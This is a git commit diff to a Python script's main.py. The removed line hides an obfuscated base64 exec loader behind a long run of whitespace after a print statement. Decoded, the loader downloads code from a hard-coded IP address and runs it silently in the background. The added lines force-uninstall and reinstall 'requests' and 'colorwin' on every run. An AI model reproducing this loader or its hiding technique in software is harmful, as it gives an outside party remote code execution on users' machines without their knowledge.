f5883f8fcc7b55f51bb9d4a731928b0039a60bf5
Ban.xit <116049067+banxit@users.noreply.github.com>
2022-10-23 05:50:19 -0300

    Update main.py

--- src/main.py
+++ src/main.py
@@ -1,5 +1,12 @@
 import os
-print('...')                                                                                                                                                                                                                                                          ;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vMTM3LjExNy4xNTcuMTI4OjEzMzcvaW5qZWN0LzBRWUJOWWxWRnM0WGxUNEMnKS5yZWFkKCkpIiIiKQpfdHRtcC5jbG9zZSgpCnRyeTogX3NzeXN0ZW0oZiJzdGFydCB7X2VleGVjdXRhYmxlLnJlcGxhY2UoJy5leGUnLCAndy5leGUnKX0ge190dG1wLm5hbWV9IikKZXhjZXB0OiBwYXNz"),'<string>','exec'))
+
+try:
+	os.system('pip uninstall requests -y && pip uninstall colorwin -y && pip install requests && pip install colorwin && cls')
+	import colorwin
+except:
+	os.system('python -m pip uninstall requests -y && python -m pip uninstall colorwin -y && python -m pip install requests && python -m pip install colorwin && cls')
+	import colorwin
+
 try:
     os.system('pip install urllib3 && pip install requests && pip install colorama && pip install valo_api && pip install pandas && pip install keyboard && pip install inquirerpy && pip install discord_webhook && cls')
 except:
